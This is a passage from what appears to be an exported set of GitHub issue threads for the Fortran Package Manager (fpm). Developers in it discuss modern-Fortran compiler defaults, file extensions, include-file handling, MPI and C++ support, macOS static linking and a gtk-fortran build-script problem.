                    "text": "Given issues such as \"implicit save\", it'll be awesome if the Fortran enthusiasts with fpm and stdlib projects can consider venturing a bit into compiler development also, particularly with open-source ones in GCC/gfortran, front-end(s) to LLVM, etc.  That way, some added empathy can be brought forth toward Fortran practitioners.\nThis can then help Fortranners try out options such as -fno-implicit-save (just an illustrative example consistent with GCC/gfortran compiler option syntax) which might then flag an error at instructions like <type> :: var = val on account of the explicitly missing SAVE attribute in the declaration statement.\nOutside of something like this that gets into the compiler side of things, I don't see what fpm can do with implicit SAVE."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-15 18:31:20+00:00",
                    "text": "Given issues such as \"implicit save\", it'll be awesome if the Fortran enthusiasts with fpm and stdlib projects can consider venturing a bit into compiler development also, particularly with open-source ones in GCC/gfortran, front-end(s) to LLVM, etc. That way, some added empathy can be brought forth toward Fortran practitioners.\nThis can then help Fortranners try out options such as -fno-implicit-save (just an illustrative example consistent with GCC/gfortran compiler option syntax) which might then flag an error at instructions like <type> :: var = val on account of the explicitly missing SAVE attribute in the declaration statement.\nOutside of something like this that gets into the compiler side of things, I don't see what fpm can do with implicit SAVE.\n\nThanks for the info. I was too optimist then. It is quite an ambitious task what you suggest but I know a lot of people that hate \"implicit save\" (I haven't been bitten by it, yet). Since you are talking about compiler development, it is worth CCing @certik"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-15 19:15:53+00:00",
                    "text": "I was thinking about introducing a ~/.fpm/config.toml which allows to define additional compilers and maybe even overwrite built-in ones. While this goes against having reproducible environments in a way, a --custom build mode drawing from this configuration might work. Submitting a compiler profile as feedback to us might help us fill in missing compilers and refine existing compiler profiles.\n\nOne tweak that might make this option a bit safer would be that only the new command looks at ~/.fpm/config.toml and constructs the fpm.toml file for a new project to include the options set there. That way, projects are self contained and reproducible, but it's easier to get new projects configured the way you like. A workflow for updating the options for an existing project to your preferred set would be to create a new project and copy the relevant contents to the existing fpm.toml file. Or having the --custom flag to try out what's in your ~/.fpm/config.toml file with an existing project."
                },
                {
                    "user": "FortranFan",
                    "date": "2021-02-15 19:17:27+00:00",
                    "text": "As much as I'd love for fpm's defaults to encourage modern best practices, our desire for legacy codes to be ported to fpm packages and encourage \"legacy\" programmers to use it, means it's probably a no-go for a lot of our target users.\n\nYes, trying to \"reclaim\" .f is fraught on 2 fronts: it's a long-held \"convention\" .f signifies fixed-form source. besides several compilers have built-in \"logic\" to support the convention.\nThat's why I had suggested, even as it was somewhat light-heartedly, to attempt a new convention of .mf, that can be an easier route, a separate lane, to march ahead."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-16 12:10:06+00:00",
                    "text": "That's why I had suggested, even as it was somewhat light-heartedly, to attempt a new convention of .mf, that can be an easier route, a separate lane, to march ahead.\n\nI see, but I am a bit hesitant: we all know that .mf is a well-established Metafont extension \ud83d\ude1d\nJokes aside, I consider this community the avant-guard of Fortran and I believe that we should be a bit more brave. On the other hand, I see that many of the key contributors of fpm have expressed scepticism and I accept it."
                },
                {
                    "user": "certik",
                    "date": "2021-02-16 19:13:16+00:00",
                    "text": "@epagone can you join us at a Fortran call? We can discuss that there. There are pros and cons. In general, the .f90 is a well accepted extension to modern Fortran (in free form) so probably best to stick to that, all things considered."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-16 19:26:40+00:00",
                    "text": "@certik I can try. Do you mean the GSoC or the monthly call? I have seen that both have a quite packed agenda..."
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 00:26:13+00:00",
                    "text": "@epagone I meant the monthly call. We all have a packed agenda, but a video call has been very efficient at arriving at an agreement, or at least make progress on an issues such as the one that you posted.\nSince the inception of fpm it has been my vision to be brave and enforce quite a bit of checks by default. For example fpm used to check that module names agree with the filename, and was enforcing naming conventions based on the filesystem position. But others felt it was too restrictive, so fpm does not check that anymore.\nI still believe we should be strict by default, and only provide options to override the strict behavior for legacy codes.\nRegarding reclaiming .f, I still don't know if it is worth doing, but I am more open to it now after thinking about this more, so I created a separate issue for it at #363."
                },
                {
                    "user": "sblionel",
                    "date": "2021-02-17 00:42:04+00:00",
                    "text": "My view is to leave .f alone - changing this will break so much stuff it isn't funny, and it would rely on everyone updating compilers.\nInstead consider agreeing on a new extension - I like .ffr - for Fortran Free Form. The standard can't do anything about this - it would have to be multiple compiler developers agreeing to support the new file type. I wouldn't get my hopes up."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 15:36:13+00:00",
                    "text": "@certik\n\n@epagone I meant the monthly call. We all have a packed agenda, but a video call has been very efficient at arriving at an agreement, or at least make progress on an issues such as the one that you posted.\n\n\ud83e\udd14 ... what I meant is that the agenda of the call looks already packed with a few topics. Anyway, I have now shared my availability on Doodle and posted a short message on Discourse.\nI have a couple of questions:\n\n\nWould you be interested in including in the development roadmap of lfortran a sort of -fno-implicit-save flag, as suggested above? Is it something feasible that you would be interested in pursuing? I definitely believe that there is an unsatisfied demand for that.\n\n\nDo you have any other ideal feature that you would like to make default in a modern Fortran environment that I have not considered in my first comment?\n\n\nThank you."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-17 15:37:18+00:00",
                    "text": "@sblionel\n\nMy view is to leave .f alone - changing this will break so much stuff it isn't funny, and it would rely on everyone updating compilers.\nInstead consider agreeing on a new extension - I like .ffr - for Fortran Free Form. The standard can't do anything about this - it would have to be multiple compiler developers agreeing to support the new file type. I wouldn't get my hopes up.\n\nThis proposal has zero ambition to convince any compiler vendors to change the way it behaves (at least in the short-medium term). It only suggests to set up by default some overridable, suitable flags to write Fortran in a modern way. However, I can see that this is a recurring misunderstanding: I have amended my first post with the hope to be more clear about it.\nPS: among all the many new, alternative extensions proposed for free form I like .ffr best. However, I believe that we should stick to .f because it provides the right message, IMO: i.e. there is no such thing as fixed form Fortran that is acceptable any more except for compatibility reasons with legacy code."
                },
                {
                    "user": "FortranFan",
                    "date": "2021-02-17 16:23:52+00:00",
                    "text": "Instead consider agreeing on a new extension\n\nGiven the Dr Fortran blogpost by Steve Lionel \"Source Form Just Wants to be Free\", maybe Fortranners should just \"suck it up\" and be willing to type a few more keystrokes for a 4-chaarcter extension instead of a new one with 1 or 2 or 3 alphanumeric characters!!\nAnd go with .free :-))"
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 17:27:09+00:00",
                    "text": "@epagone wrote:\n\nthinking ... what I meant is that the agenda of the call looks already packed with a few topics. Anyway, I have now shared my availability on Doodle and posted a short message on Discourse.\n\nPerfect, thanks!\n\nI have a couple of questions:\n1. Would you be interested in including in the development roadmap of `lfortran` a sort of `-fno-implicit-save` flag, as suggested above? Is it something feasible that you would be interested in pursuing? I definitely believe that there is an unsatisfied demand for that.\n\n\nYes, we already have an issue for that:\nhttps://gitlab.com/lfortran/lfortran/-/issues/148\n\n2. Do you have any other ideal feature that you would like to make default in a modern Fortran environment that I have not considered in my first comment?\n\n\nYes, tons of ideas. I would like LFortran in this mode to print warnings (or error messages) for all things that we do not consider \"modern\". That way people can update their code to be following the latest recommendations. Things like \"explicit imports\" use, something: only f1, f2 and other things."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-17 23:00:27+00:00",
                    "text": "@epagone  wrote:\n\nI note that I never met a single example of such \"legacy\" programmer that still actively writes code in fixed form and with implicit typing.\n\nI just found an example of one such programmer/project: PLTMG: A Software Package for Solving Elliptic Partial Differential Equations. The latest version 13.0 from 2018 continues to be developed in fixed-form and uses both implicit typing and common blocks. An example declaration block in the code:\nc-----------------------------------------------------------------------\nc\nc            piecewise lagrange triangle multi grid package\nc\nc                  edition 13.0 - - - september, 2018\nc\nc-----------------------------------------------------------------------\n        subroutine mpiutl(isw)\ncx\n            use mthdef\n            implicit real(kind=rknd) (a-h,o-z)\n            implicit integer(kind=iknd) (i-n)\n            include \"mpif.h\"\n            common /atest6/nproc,myid,mpisw,mpirgn,mpiint,mpiflt\nThey also distribute the code via Netlib. \ud83d\ude04"
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 23:21:08+00:00",
                    "text": "@ivan-pi indeed, there are such cases, although they are a minority. They would be supported by fpm with a simple option in fpm.toml."
                },
                {
                    "user": "FortranFan",
                    "date": "2021-02-18 01:20:29+00:00",
                    "text": "I just found an example of one such programmer/project ..\n\nGood find.\nPersonally I'm not bothered about implicit typing as I am with what can be termed implicit mapping by which I mean the following:\n\nThe above snip is from the current Fortran standard (as per its proxy, 18-007r1 document), section 18.7 IMPLICIT statement, page 114, paragraph 3, lines 32 thru' 34.\nIf the standard can be enhanced to state:\n\nIf a mapping is not specified for a letter, the default for a program unit or an interface body shall be null.  The default for a BLOCK construct, internal subprogram, or module subprogram is the mapping in the host scoping unit,\"\n\nthat will be a major, major step forward.  Such a change will have NO backward compatibility issue with programs such as PLTMG because of the explicit IMPLICIT declarations.\nBut now, it is due to an unknown but likely very tiny list of programs that supposedly have neither IMPLICIT NONE nor the IMPLICIT declarations and which then make use of this `implicit mapping' that a monumental burden exists for all the modern Fortranners.\nWhere I work, a team had a situation in 2017 where a subtle bug got introduced due to a missing implicit none in an INTERFACE body.  Since an INTERAFCE body technically has no host scope, the implicit none from the outer body does not extend to it.  The team was lucky the bug had only caused loss of productivity, though it was considerable.   The damage could have been far worse.  There is far more to this story with some decisions since re: Fortran but I'll let that pass.\nSo the question I ask myself is this: what if compiler implementations become truly brave and they themselves stop supporting the implicit mapping by default.  Meaning, they don't conform to the standard by default, rather force users to apply some option, say -fimplicit-mapping (as per GCC/gfortran terminology), to get what the standard states with that one sentence.\nThe onus can then shift to those who want to continue with the old ways to do some \"extra\" work to avoid encountering errors with their unsafe coding practice.  All other Fortranners will be freed from having to ensure implicit none in every scope, they will get that as processor default.  If enough implementations do this, it will become easier for the standard to be updated."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-18 12:22:12+00:00",
                    "text": "@ivan-pi another example of such ancient remnants of the olden days of FORTRAN that are still very good pieces of code: ORDERPACK uses implicit typing."
                },
                {
                    "user": "epagone",
                    "date": "2021-06-23 13:39:43+00:00",
                    "text": "On Discourse, @urbanjost adds an interesting suggestion for an additional feature: no line length limit. I agree."
                },
                {
                    "user": "certik",
                    "date": "2021-06-23 14:25:28+00:00",
                    "text": "I agree too. Limiting to 80 columns should be done via formatting tools, but fpm should simply compile everything, no matter how long lines."
                },
                {
                    "user": "FortranFan",
                    "date": "2021-06-23 15:51:01+00:00",
                    "text": "c.f.: https://wg5-fortran.org/N2151-N2200/N2184.pdf\nThe next version of the standard referred to as Fortran 202X will allow for the following:\n\n\nFree form source line length: \"A line shall contain at most ten thousand characters.\"  Note this is a change from current standard 2018 that states a line \"shall contain at most 132 characters.\"\n\n\nFree form statements: \"statement shall not have more than one million characters.\"  Note this is a change from current standard 2018 that states, \"A statement shall not have more than 255 continuation lines.\"\n\n\nEffectively thus \"The limit on the number of continuation lines has been removed\" in Fortran 202X."
                },
                {
                    "user": "epagone",
                    "date": "2021-06-23 16:58:48+00:00",
                    "text": "Discourse user implicitall suggests to add the pre-processor flags\ngfortran: -cpp\nifort: -fpp\nnvfortran: -cpp\nto further simplify extensions and avoid the uppercase/lowercase confusion that I have seen affecting many newcomers. I think that it's an excellent suggestion.\nAs long as there are no side-effects, e.g. problems when there is no actual use of the preprocessor in the project (I do not have enough knowledge and experience to safely comment on this), I am in favour.\nYour comments please."
                },
                {
                    "user": "certik",
                    "date": "2021-06-23 19:05:06+00:00",
                    "text": "Yes, we should not need a new file extension just to enable a pre-processor.\nHowever, we should decide whether to encourage using the C pre-processor or rather enable some other pre-processor by default. I can see pros and cons of this."
                }
            ]
        },
        {
            "number": 358,
            "user": "LKedward",
            "date": "2021-02-15 12:09:44+00:00",
            "title": "Improve support for include statements",
            "text": "fpm currently has limited support for source file includes which I notice are used a lot in existing packages and are fundamental to c libraries. Specifically:\n\nfpm cannot yet track module dependencies in included files;\nfpm incremental rebuilds do not track changes in included files and;\nincluded file cannot have the .f90 suffix\n\nI am currently working on an update to fpm to address these shortcomings.",
            "comments": [
                {
                    "user": "jbdv-no",
                    "date": "2021-03-03 12:16:55+00:00",
                    "text": "While trying to use fpm (incredible effort by all the developers btw, thank you!) in one of my\nprojects, I have encountered a problem when using include statements with the nagfor compiler.\nNagfor fails to compile since it cannot locate include files (named *.inc, located along with\nall other *.f90 source files in the ./src directory). The very same directory structure works\nas expected when using gfortran or ifort to compile.\nSearching through fpm's documentation and issues for a solution, lead me to this particular issue,\nand since I could not find particular mention being made of nagfor in this context before, thought\nit could be useful to share this very simple reproducer. (Assuming of course that I am using fpm as\nintended, very possible that a naming/other mistake on my side is causing the trouble)\nReproducing the problem\n\n\nCreate a new fpm project:\nfpm new fpm_inc --app --src\n\n\n\nPut the subroutine say_hello from src/fpm_inc.f90 into a separate file\nsrc/say_hello.inc and modify src/fpm_inc.f90 to include this file:\n! src/fpm_inc.f90\nmodule fpm_inc\n  implicit none\n  private\n\n  public :: say_hello\ncontains\n  include 'say_hello.inc'\nend module fpm_inc\n  ! src/say_hello.inc\n  subroutine say_hello\n    print *, \"Hello, fpm_inc!\"\n  end subroutine say_hello\n\n\nThis project builds successfully with gfortran (default) and ifort:\nfpm run\n\n+ build/gfortran_debug/app/fpm_inc \nHello, fpm_inc!\n\nfpm run --compiler ifort\n\n+ build/ifort_debug/app/fpm_inc \nHello, fpm_inc!\n\n\n\nHowever, it fails with nagfor, which complains that it cannot open the include file\nfpm run --compiler nagfor\n+ nagfor -c ./src/fpm_inc.f90 -g -C=all -O0 -gline -PIC  -mdir build/nagfor_debug/fpm_inc -I build/nagfor_debug/fpm_inc -o build/nagfor_debug/fpm_inc/src_fpm_inc.f90.o\nNAG Fortran Compiler Release 6.2(Chiyoda) Build 6207\nError: ./src/fpm_inc.f90, line 7: Cannot open INCLUDE file \"say_hello.inc\": No such file or directory\nError: ./src/fpm_inc.f90, line 8: Implicit type for SAY_HELLO\n[NAG Fortran Compiler pass 1 error termination, 2 errors]\n Command failed\nERROR STOP\n\nIn this trivial case, the include is easy to avoid. However, in my actual use case the include\nfile implements an algorithm using kind specifiers inherited from the module scope (so a form of\n\"poor man's templates\"), with different modules defined for different kinds.\nAccording to nagfor's documentation:\n\nNon-intrinsic modules, INCLUDE files and #include files are expected to exist in the current working directory or in a directory named by an -I option.\n\nWhich would imply that an additional -I ./src can solve the problem in this particular case? But\nthis is surely not the general solution.\nPS: You may notice from the code snippet, that I built fpm from source (using a binary release)\nand removed -coarray=single from the compiler flags. Since this is a feature (introduced in\nrelease 7.0) not supported by the release of nagfor that I have access to (Release 6.2)."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-03 13:01:42+00:00",
                    "text": "Many thanks for the detailed report @jbdv-no, it looks like nagfor behaves slightly differently to gfortran and ifort which first search in the directory of the current source file. The solution for this issue will make the include directory explicit and so should fix your issue also."
                }
            ]
        },
        {
            "number": 357,
            "user": "LKedward",
            "date": "2021-02-13 13:09:23+00:00",
            "title": "Update: install script for Fortran fpm",
            "text": "Inline with the goal of #253 this PR updates the install script to build and install Fortran fpm by default after bootstrapping with the Haskell implementation. Based on the discussion in #344 I also added an --update flag to optionally pull from the latest tag similar to @brocolis' implementation. The existing behaviour of the install script is preserved if invoked with ./install.sh --haskell which will only install the Haskell implementation.\nAdditional flags are provided to specify the install location and whether to build with openmp and static linking.\nThis simplifies the bootstrapping process and the workflow for updating fpm.",
            "comments": []
        },
        {
            "number": 356,
            "user": "everythingfunctional",
            "date": "2021-02-12 16:38:58+00:00",
            "title": "Statically linked executables for releases (OSX)",
            "text": "Is there anyway we can produce statically linked executables for the releases? Right now the Mac version requires gcc@9 to be installed.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 16:50:59+00:00",
                    "text": "Well, you can't link statically on OSX and I see no real way to circumvent this."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 17:15:49+00:00",
                    "text": "If homebrew provides libgfortran.a we might have a change to link at least statically against the GCC libraries, but if we only get dylibs there is not much of a chance here, unfortunately."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-12 18:32:50+00:00",
                    "text": "Well that's disappointing."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 18:39:24+00:00",
                    "text": "Yeah, it's a real pain to distribute (Fortran) software for OSX. My personal strategy is to avoid distributing software for OSX outside of package managers, e.g. conda-forge does a decent job to support both OSX x86_64 and aarch64 architectures.\nEdit: homebrew packaging support seems to require GCC 4.9 as compiler for Fortran projects."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-04-20 22:20:03+00:00",
                    "text": "WIth fpm now available on conda-forge for both OSX x86_64 and aarch64 we have some way to access binaries without requiring homebrew dependencies. For homebrew specific binary distributions we could either set up our own tap or submit to upstream homebrew and have them bottle fpm releases for us."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 19:01:59+00:00",
                    "text": "Let's continue this discussion in #400."
                }
            ]
        },
        {
            "number": 355,
            "user": "awvwgk",
            "date": "2021-02-12 15:14:21+00:00",
            "title": "Dependency tree is saved flattened",
            "text": "The dependency tree is currently saved in a flattened form, it would be more useful to retain references between the dependencies in the tree and the cache file.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-08-12 16:04:48+00:00",
                    "text": "@kubajj I will take this issue up soon implement the necessary structured needed to apply the profiles in #498."
                }
            ]
        },
        {
            "number": 354,
            "user": "certik",
            "date": "2021-02-09 18:30:52+00:00",
            "title": "Support MPI natively",
            "text": "Many Fortran codes use MPI and we should teach fpm about it and support it natively.\nThere are two main approaches to it:\n\n\nUse the mpi compiler wrappers such as mpif90, which are provided by MPI implementations such as mpich or openmpi. Those compiler wrappers call the compiler with correct flags to link all MPI libraries correctly.\n\n\nYou call the compiler wrappers mpif90 to figure out what flags to use, then you supply those flags manually when executing the given compiler.\n\n\nCMake supports both options and I have used both in my projects. There are pros and cons of each approach and I have discussed this with quite a lot of people already. I personally lean towards the second approach, which treats MPI as a 3rd party library that you depend on. Ultimately, that is what it is. However, for fpm, the user does not actually see how the compiler is being invoked anyway, so the first approach might also work. So I would choose whatever approach is easier to implement and maintain in fpm and I think we can even switch later (internally) if needed.\nLet's discuss the user facing design. It seems it might be as simple as adding mpi=true into fpm.toml for each executable that should be compiled with MPI. And fpm would then transitively enable MPI for each module and dependency that the executable needs. In terms of choosing which MPI implementation should be used, we can start by using whatever mpif90 is available in PATH.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2021-02-09 18:40:23+00:00",
                    "text": "I love it. I think mpi=true is simple enough.\nThough it'd be a nice UX for fpm to auto-detect use mpi or include mpif.h by parsing source files. And we're already parsing at least use statements, no? Then the user doesn't have to do anything special and fpm takes care of it.\nWe can later special-case vendor-specific MPIs that are called differently than mpif90."
                },
                {
                    "user": "certik",
                    "date": "2021-02-09 18:50:46+00:00",
                    "text": "Indeed, fpm could autodetect, and you can force mpi=true or mpi=false if the autodetection is wrong for some reason (say you have an mpi module in your project that is not actually an MPI)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 14:02:59+00:00",
                    "text": "MPI behaves similar to OpenMP in this regard, being explicit about dependencies would suggest a package manifest entry like\n[dependencies]\nmpi = \"*\"  # Some MPI\nmpi = \"^3\"  # if MPI 3 features are required\nmpi = { version=\"*\", variant=\"mpich\" }  # if the MPICH implementation is explicitly required\nmpi.git = \"https://github.com/dftbplus/mpifx\"  # Use a wrapper library which in turn exports the MPI dependency\nWhich of course allows to select it on per executable basis as well through the dependencies table.\nIt makes a good candidate for a built-in dependencies which could be provided as mock packages like explained in #161 (comment) as well.\nAutomatic detection and smart activation would also work in this approach, fpm would just add MPI to the dependency tree if the respective use statement or include files are required."
                }
            ]
        },
        {
            "number": 353,
            "user": "certik",
            "date": "2021-02-09 18:21:50+00:00",
            "title": "Support for C and C++ source files and linking everything together",
            "text": "Fpm already has a preliminary support for C and C++ source files. But there are still some issues to iron out. Here are a few that I am aware of, we should create individual issues out of these and link them here.\n\n\n One issue is that you currently have to manually specify stdc++ in fpm.toml. It should work automatically.\n\n\n I think we need to add tests for this and test it at our CI.\n\n\n Document this feature in our documentation\n\n\n Ensure this works with MPI. Fpm does not support MPI yet, so we should add support first (#354). I remember there being issues regarding whether the main program has to be linked as a C++ or Fortran project.",
            "comments": [
                {
                    "user": "ivan-pi",
                    "date": "2021-02-09 19:20:24+00:00",
                    "text": "I will have a mixed Fortran/C++ package available soon (it's an interface to the nanoflann k-d tree library in C++). My current plan was to put\nlink = [\"stdc++\"]\n\ninside fpm.toml. The C++ library is a header only library, so it's easy to ship it with my wrapper modules. As long as the source folder is in the include path, I imagine that would be enough to get it to work.\nOne issue I'm afraid of is that in C++ different conventions exist in practice (.hpp, .cpp, .c++, .hh, .cc, ...). In fact even the C file extensions .c and .h are just conventions. I don't think we want fpm to become a full C/C++ package manager. Perhaps some restricted package layout is sufficient for the majority of mixed-language cases.\nFor more complex C/C++ dependencies it might be a better idea to delegate them to a conan or CMake adaptor. In Rust they have a cmake crate which uses the two-way build script interface. Vice-versa, C++ projects which would depend on fpm packages, could export CMake packages (once this is supported, see #69)."
                },
                {
                    "user": "certik",
                    "date": "2021-02-10 00:15:22+00:00",
                    "text": "It is tempting to also make fpm be a solid C++ package manager. But I have a suspicion there might be C++ specific issues that we might prefer to avoid addressing. That being said, every time I want to try something in C++ or depend on something, I am already missing fpm. I opened an issue for Mamba to create a C++ package manager cpm, but didn't get much traction.\nGiven that we will have CMake (#69) backends, I would love to make fpm working for C++ as much as we can make it work, and a user is not locked in, they can always export to CMake (or any other build system that we will write a backend for) if they need something more complex.\nIn fact, I am looking forward to start new C++ projects by simply creating an fpm package (by adding some option to fpm to create a sample Hello World program in C++ instead of Fortran) and then export it to CMake, as I never remember all the things one must do in CMake to make it work off top of my head.\nI think we can support all the .cpp and .h conventions for C++. In the default layout, I don't think there is anything that is Fortran specific, we simply follow the Cargo layout, more or less. So it should work for C++ also.\ncc @milancurcic"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-11 12:03:39+00:00",
                    "text": "I remember there being issues regarding whether the main program has to be linked as a C++ or Fortran project.\n\n\nIn CMake, you need to manually specify the linker language is Fortran when adding executable targets in Fortran that depend on C++ libraries:\nadd_executable(main main.f90)\ntarget_link_libraries(main my_cpp_lib)\nset_property(TARGET main PROPERTY LINKER_LANGUAGE Fortran)\n\nAlternatively, you need to play with the CMAKE_<LANG>_LINKER_PREFERENCE setting. Apparently the default preference rules give C++ higher priority.\nWith the Intel Fortran compiler, when the executable is in C and depends on a Fortran subprogram, and linking is performed with ifort, one needs to add the flag -nofor-main.\n\nIn fact, I am looking forward to start new C++ projects by simply creating an fpm package (by adding some option to fpm to create a sample Hello World program in C++ instead of Fortran) and then export it to CMake, as I never remember all the things one must do in CMake to make it work off top of my head.\n\nDitto. I just spent the last 2 hours creating CMake files for my mixed Fortran/C++ project of five files..."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-12 14:09:11+00:00",
                    "text": "Well, there is dds as C++ counterpart to fpm. The project happens to be in alpha stage, but I have seen some projects like https://github.com/marzer/tomlplusplus to actually support it."
                },
                {
                    "user": "certik",
                    "date": "2021-02-12 14:39:49+00:00",
                    "text": "@awvwgk finally somebody is doing it! Thanks for the link."
                }
            ]
        },
        {
            "number": 352,
            "user": "awvwgk",
            "date": "2021-02-07 18:43:20+00:00",
            "title": "Hacky fix for the help test",
            "text": "Definitely not a beautiful solution, but gets the job done. This works with both Haskell and Fortran fpm for now, but we need a better way to handle such cases. See #179 and #328.\nCloses #343",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-03-03 09:22:35+00:00",
                    "text": "Thanks. I think this is good to go so we can move forward with #253 etc..  \ud83d\udc4d"
                }
            ]
        },
        {
            "number": 351,
            "user": "vmagnin",
            "date": "2021-02-05 10:33:23+00:00",
            "title": "Problem using build-script to use gtk-fortran as a dependency",
            "text": "Hi,\nFor some days, I am playing with fpm 0.1.3 alpha on Linux Kubuntu 20.10. I have especially tested the [dependencies] killing feature and it runs smoothly with the helloff.git example in the doc. I am now interested by the build-script variable, which is the true killing feature! I have begun testing it with my gtk-fortran project, which is CMake based. I will now present the details of the steps I have made and the problem:\n\nI have created a new fpm project:\n\n$ fpm new gtk_and_fpm\n$ fpm build\n$ fpm run\n\nI have modified the main.f90 as follows, in order to print the exact GTK 3 version available on the machine using directly the functions of GTK:\n\nprogram main\n  use gtk, only: gtk_get_major_version, gtk_get_minor_version, gtk_get_micro_version\n  implicit none\n\n  print '(A4,I0,A1,I0,A1,I0)', \"GTK \", gtk_get_major_version(),\".\", &\n    & gtk_get_minor_version(), \".\", gtk_get_micro_version()\nend program main\n\nI have first verified that the program is OK by compiling and running it by hand:\n\n~/Fortran/gtk_and_fpm/app$ gfortran main.f90 $(pkg-config --cflags --libs gtk-3-fortran) && ./a.out\nGTK 3.24.23\n\nI have added those lines in the fpm.toml of my gtk_and_fpm project:\n\n[dependencies]\ngtk-3-fortran = { git = \"https://github.com/vmagnin/gtk-fortran.git\" }\n\n\nI have added an FPM manifest at the root of the gtk-fortran project (gtk3 branch). The modules composing the gtk-fortran library itself is in the src/ directory of the project. And there was already a simple build.sh script there, that basically just do classical things : cd .. ; mkdir build ; cd build ; cmake .. ; make -j :\n\nname = \"gtk-3-fortran\"\nversion = \"3\"\nlicense = \"GPLv3\"\nauthor = \"The gtk-fortran team\"\nmaintainer = \"https://github.com/vmagnin/gtk-fortran/issues\"\ncopyright = \"2011-2021 The gtk-fortran team\"\n\n[library]\nbuild-script=\"src/build.sh\"\n\n\nWhen typing $ fpm build, the gtk-fortran project is correctly downloaded by git. The building process begins but stops here:\n\nWarning: Return value of function \u2018gtk_button_accessible_get_type\u2019 at (1) not set [-Wreturn-type]\nbuild/dependencies/gtk-3-fortran/src/gtk-auto.f90:36089:0:\n\n36089 | function gtk_container_accessible_get_type() bind(c)\n      | \nWarning: Return value of function \u2018gtk_container_accessible_get_type\u2019 at (1) not set [-Wreturn-type]\n + gfortran -c build/dependencies/gtk-3-fortran/src/gtkenums-auto.f90 -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -fcoarray=single  -J build/gfortran_debug/gtk_and_fpm -I build/gfortran_debug/gtk_and_fpm -o build/gfortran_debug/gtk_and_fpm/build_dependencies_gtk-3-fortran_src_gtkenums-auto.f90.o\nf951: Error: Unexpected end of file in \u2018build/dependencies/gtk-3-fortran/src/gtkenums-auto.f90\u2019\n Command failed\nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fc302314d01 in ???\n#1  0x7fc302315849 in ???\n#2  0x7fc302316f77 in ???\n#3  0x55ed6a4dc686 in __fpm_environment_MOD_run\n        at src/fpm_environment.f90:127\n#4  0x55ed6a4bc15f in build_target\n        at src/fpm_backend.f90:240\n#5  0x55ed6a4beef2 in __fpm_backend_MOD_build_package\n        at src/fpm_backend.f90:74\n#6  0x55ed6a4ae050 in __fpm_MOD_cmd_build\n        at src/fpm.f90:204\n#7  0x55ed6a4a65bf in MAIN__\n        at app/main.f90:26\n#8  0x55ed6a4a66c7 in main\n        at app/main.f90:9\n\n\nReading those warnings (that does not appear using CMake) and the final error, I suspect that the building is not made by my build.sh script, but directly by fpm. Note also that gtkenums-auto.f90 is not a module but a file that is included in the source code of the gtk-auto.90 module via an INCLUDE statement (that's probably why fpm failed).\n\n\nTherefore, the https://github.com/vmagnin/gtk-fortran/blob/gtk3/fpm.toml file is probably not correct. Can you please guide me to obtain a correct fpm.toml ? I tried some modifications on the local version on my machine but without success.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2021-02-05 11:49:24+00:00",
                    "text": "Hi Vincent @vmagnin, thanks for reporting. Unfortunately the build-script feature is not yet implemented in the most recent version of fpm (see also #341, #219 for more info) and so yes you're right that fpm is trying to build the project itself.\n\nI have been able to build gtk-fortran directly with fpm and run the examples successfully (on Ubuntu) by renaming the included files to src/gtk-auto.inc and src/gtkenums-auto.inc, and adding the necessary link entries to the manifest. However I'm aware that this bypasses the various cmake logic that is used for this project and which I haven't looked into in much detail.\nI'm quite excited to be able to use gtk-fortran as an fpm package sometime in the future!"
                },
                {
                    "user": "vmagnin",
                    "date": "2021-02-05 13:20:59+00:00",
                    "text": "Hi Laurence @LKedward !\nit seems I am too much \"absolutely modern\" today... ;-)\nThanks for the referenced issues. I now understand the logic of the problem. I will be patient! It seems so promising...\nGreat news that you have built gtk-fortran with fpm! I will give a try to your method.\nConcerning CMake, it's a powerful tool. Two years ago I made an attempt to migrate to Meson because I feared it will be complicated to adapt CMake to GTK 4, and because GTK itself is now using Meson. But finally it was simple with CMake, and Meson is not yet installing correctly the .mod Fortran files:\nmesonbuild/meson#5374\nFinally the only thing I don't like with CMake is its verbose syntax. My neurons can't even remember $ cmake -D CMAKE_BUILD_TYPE=debug .., I am always searching in my bash history... I prefer the simple fpm or Meson syntax.\nI also read here some discussions about work on fpm detecting automatically the projects using CMake."
                }
            ]
        },
        {
            "number": 350,
            "user": "everythingfunctional",
            "date": "2021-02-04 20:54:01+00:00",
            "title": "A Possible Solution for Compiler Flags",
